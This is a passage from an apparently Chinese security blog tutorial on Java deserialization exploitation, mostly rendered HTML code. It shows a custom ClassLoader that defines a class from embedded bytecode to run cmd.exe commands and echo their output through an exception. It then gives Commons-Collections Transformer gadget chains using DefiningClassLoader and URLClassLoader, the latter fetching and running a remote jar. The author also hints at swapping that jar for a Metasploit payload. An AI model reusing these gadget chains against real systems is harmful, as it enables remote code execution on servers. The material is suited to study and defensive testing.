<span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">89</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">4</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">5</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">83</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">77</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">89</span>, <span class="number">44</span>, <span class="number">18</span>, <span class="number">10</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">11</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">78</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">89</span>, <span class="number">45</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">58</span>, <span class="number">4</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">89</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">58</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">6</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">89</span>, <span class="number">58</span>, <span class="number">6</span>, -<span class="number">58</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">19</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">87</span>, -<span class="number">89</span>, -<span class="number">1</span>, -<span class="number">24</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">5</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">21</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">22</span>, -<span class="number">65</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">2</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">52</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 只处理Summer类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// 调用JVM的defineClass方法定义Summer类</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建自定义的类加载器</span></span><br><span class="line">        demo2 loader = <span class="keyword">new</span> demo2();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用自定义的类加载器加载TestHelloWorld类</span></span><br><span class="line">            Class testClass = loader.loadClass(testClassName);</span><br><span class="line">            <span class="comment">// 反射创建Summer类，等价于 Summer t = new Summer(‘ipconfig);</span></span><br><span class="line">            testClass.getConstructor(String.class).newInstance("ipconfig");</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Summer类代码，这里是将回显结果使用异常类抛出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Summer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InputStream stream = (<span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;)).start().getInputStream();</span><br><span class="line">        InputStreamReader streamReader = <span class="keyword">new</span> InputStreamReader(stream, Charset.forName(<span class="string">"gbk"</span>));</span><br><span class="line">        BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(streamReader);</span><br><span class="line">        StringBuffer buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        String line = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            buffer.append(line).append(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200605102043439.gif" alt="在这里插入图片描述"></p><hr><p>&emsp;&emsp; 工具类将<code>.class</code>字节码文件转化成字节数组，可以添加自定义改造成适合自己方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FiletoBytes</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FiletoBytes</span><span class="params">(String file_name)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Author</span>:         summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@CreateDate</span>:     2020/5/26 14:39</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateUser</span>:     summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateDate</span>:     2020/5/26 14:39</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateRemark</span>:   修改内容</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Version</span>:        v1.0.0</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>:    只需要传入文件的绝对路径就可以进行转化</span></span><br><span class="line"><span class="comment">     *  需要根据文件大小修改bytes大小</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">FiletoBytes</span><span class="params">(String filename )</span></span>&#123;</span><br><span class="line">        String buf = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 20m</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        File file = <span class="keyword">new</span> File(filename);</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line"></span><br><span class="line">            fis.read(bytes);</span><br><span class="line">            buf = Arrays.toString(bytes);</span><br><span class="line">            fis.close();</span><br><span class="line">            <span class="keyword">return</span> buf;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> buf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Author</span>:         summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@CreateDate</span>:     2020/5/26 15:20</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateUser</span>:     summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateDate</span>:     2020/5/26 15:20</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateRemark</span>:   修改内容</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Version</span>:        v1.0.0</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>:    bytes大小需要传入设置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">FiletoBytes</span><span class="params">(String filename ,<span class="keyword">byte</span>[] bytes)</span></span>&#123;</span><br><span class="line">        String buf = <span class="keyword">null</span>;</span><br><span class="line">        File file = <span class="keyword">new</span> File(filename);</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line"></span><br><span class="line">            fis.read(bytes);</span><br><span class="line">            buf = Arrays.toString(bytes);</span><br><span class="line">            fis.close();</span><br><span class="line">            <span class="keyword">return</span> buf;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> buf;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单使用demo，将Summer.class文件转化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Summer.class的绝对路径</span></span><br><span class="line">    <span class="comment">// E:\Soures\JavaLearnVulnerability\Summer.class自行修改</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String file_name = <span class="string">"E:"</span> + File.separator + <span class="string">"Soures"</span> + File.separator + <span class="string">"JavaLearnVulnerability"</span> + File.separator + <span class="string">"Summer.class"</span>;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1600</span>];</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        FiletoBytes filetoBytes = <span class="keyword">new</span> FiletoBytes(file_name);</span><br><span class="line"><span class="comment">//        System.out.println("直接传入文件，默认bytes大小默认为4kb");</span></span><br><span class="line"><span class="comment">//        System.out.println(filetoBytes.FiletoBytes(file_name));</span></span><br><span class="line">        System.out.println(<span class="string">"传入文件和bytes"</span>);</span><br><span class="line">        System.out.println(filetoBytes.FiletoBytes(file_name,bytes));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>温馨提示：在转文件的时候最好先看看文件大小，传入合适的数组大小。因为后面这些多余出0要删除，否则会报错。<br><img src="https://img-blog.csdnimg.cn/2020060510594243.png" alt="在这里插入图片描述"></p></blockquote><hr><h2 id="defineclass’s-demo"><a href="#defineclass’s-demo" class="headerlink" title="defineclass’s demo"></a>defineclass’s demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">defineclass</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String classname = <span class="string">"summer.classload.Summer"</span>;</span><br><span class="line">    <span class="comment">// 部分字节码，完整获取github。</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] classBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">67</span>,&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用反射的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        defineclass defineclass = <span class="keyword">new</span> defineclass();</span><br><span class="line">        Class cls = defineclass.defineClass(classname,classBytes,<span class="number">0</span>,classBytes.length);</span><br><span class="line">        cls.getConstructor(String.class).newInstance("whoami");</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200605110551596.png" alt="在这里插入图片描述"></p><hr><h2 id="ccdefineclass"><a href="#ccdefineclass" class="headerlink" title="ccdefineclass"></a>ccdefineclass</h2><p>&emsp;&emsp; 改写cc链，来达到获取回显。这里有一个坑，JDK自带<code>java.lang.ClassLoader</code>类下的defineclass是权限是<code>protected</code>不能直接通过反射调用，故不顾虑使用这个类，笔者使用的是weblogic中的<code>wlfullclient.jar!.org.mozilla.classfile.DefiningClassLoader</code>。<br>笔者这里只给出部分实现代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="comment">//                new ConstantTransformer(ClassLoader.class),</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(DefiningClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getConstructor",</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Class[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Class[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Object[0]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"defineClass"</span>,</span><br><span class="line">                        new Class[]&#123;String.class,byte[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">"summer.classload.Summer"</span>,bytes&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"Exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;"ipconfig"&#125;),</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><hr><h1 id="URLClassLoader远程加载文件回显"><a href="#URLClassLoader远程加载文件回显" class="headerlink" title="URLClassLoader远程加载文件回显"></a>URLClassLoader远程加载文件回显</h1><p>&emsp;&emsp; URLClassLoader是<code>java.net</code>下的类，继承了<code>java.lang.Classloader</code>类对象。URLClassLoader可以从远端或者本地加载jar/class文件。</p><p><img src="https://img-blog.csdnimg.cn/20200605154823661.png" alt="在这里插入图片描述"></p><hr><h2 id="URLClassLoader’s-Demo"><a href="#URLClassLoader’s-Demo" class="headerlink" title="URLClassLoader’s Demo"></a>URLClassLoader’s Demo</h2><ol><li>编写exp代码，代码已经上传至GitHub项目中。</li><li>编译<code>javac Summer.java</code></li><li>创建http服务 <code>py -2 -m SimpleHTTPServer  8090</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://127.0.0.1:8090/summer.jar"</span>);</span><br><span class="line"><span class="comment">//        URL url = new URL("file:e:/summer.jar");</span></span><br><span class="line"></span><br><span class="line">        URLClassLoader ucl = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        Class cls = ucl.loadClass(<span class="string">"Summer"</span>);</span><br><span class="line">        Method m = cls.getMethod(<span class="string">"Exec"</span>,String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        m.invoke(cls.newInstance(),<span class="string">"ipconfig"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200605160339489.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200605170754423.gif" alt="在这里插入图片描述"></p><hr><h2 id="CCURLClassLoader"><a href="#CCURLClassLoader" class="headerlink" title="CCURLClassLoader"></a>CCURLClassLoader</h2><p>&emsp;&emsp; 同样使用cc链来改造此回显方法，<code>试想一下把这个jar换成msf的payload可以达到什么效果呢？</code>这里我不实现，自己可以去脑洞实现一下，很简单的，我相信看过我文章的人都应该会。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(URLClassLoader<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getConstructor",</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Class[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Class[]&#123;URL[].class&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"newInstance"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Object[]<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;new Object[]&#123;new URL[]&#123;new URL("http://127.0.0.1:8090/summer.jar")&#125;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"loadClass"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new 